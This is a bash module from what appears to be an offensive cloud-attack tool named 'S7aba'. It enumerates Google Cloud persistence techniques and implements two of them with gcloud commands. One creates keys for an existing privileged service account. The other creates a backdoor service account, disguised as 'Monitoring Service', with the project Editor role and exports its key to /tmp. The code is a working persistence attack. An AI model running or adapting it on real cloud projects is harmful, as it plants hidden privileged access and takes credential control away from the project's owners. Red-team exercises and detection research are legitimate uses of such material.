#!/usr/bin/env bash
# S7aba - GCP Persistence Module

enumerate_persistence_options() {
    log_info "Evaluating GCP persistence techniques..."
    log_finding "HIGH" "SA Key Creation" "Generate key for existing privileged service account"
    log_finding "HIGH" "New Service Account" "Create new SA with IAM bindings"
    log_finding "MEDIUM" "Cloud Function Trigger" "HTTP-triggered function for persistent callback"
    log_finding "MEDIUM" "Cloud Scheduler" "Scheduled job for periodic execution"
    log_finding "MEDIUM" "Pub/Sub Trigger" "Event-driven persistence via Pub/Sub"
    log_finding "INFO" "Compute Startup Script" "Inject into VM metadata startup-script"
    log_finding "INFO" "IAM Binding" "Add external member to project IAM"
}

deploy_persistence() {
    log_warn "Select persistence mechanism:"
    echo -e "  1) Create SA key for existing account"
    echo -e "  2) Create new backdoor SA"
    echo -e "  3) Inject VM startup script"
    read -rp "$(echo -e "${YELLOW}[?] Choice: ${RESET}")" choice

    local project
    project=$(gcloud config get-value project 2>/dev/null)

    case "$choice" in
        1)
            gcloud iam service-accounts list --format='table(email,displayName)' 2>/dev/null
            read -rp "$(echo -e "${YELLOW}[?] Target SA email: ${RESET}")" sa
            if [[ $DRY_RUN -eq 1 ]]; then
                log_info "DRY-RUN: Would create key for $sa"
            else
                gcloud iam service-accounts keys create /tmp/s7aba_key.json --iam-account="$sa" 2>/dev/null
                log_success "Key created: /tmp/s7aba_key.json"
            fi
            ;;
        2)
            local sa_name="svc-monitor-$(date +%s | tail -c 5)"
            if [[ $DRY_RUN -eq 1 ]]; then
                log_info "DRY-RUN: Would create SA '$sa_name' with Editor role"
            else
                gcloud iam service-accounts create "$sa_name" --display-name="Monitoring Service" 2>/dev/null
                gcloud projects add-iam-policy-binding "$project" \
                    --member="serviceAccount:${sa_name}@${project}.iam.gserviceaccount.com" \
                    --role="roles/editor" 2>/dev/null
                gcloud iam service-accounts keys create /tmp/s7aba_backdoor.json \
                    --iam-account="${sa_name}@${project}.iam.gserviceaccount.com" 2>/dev/null
                log_success "Backdoor SA created with Editor role"
                log_info "Key: /tmp/s7aba_backdoor.json"
            fi
            ;;
        *)
            log_info "Selected mechanism requires manual implementation"
            ;;
    esac
}
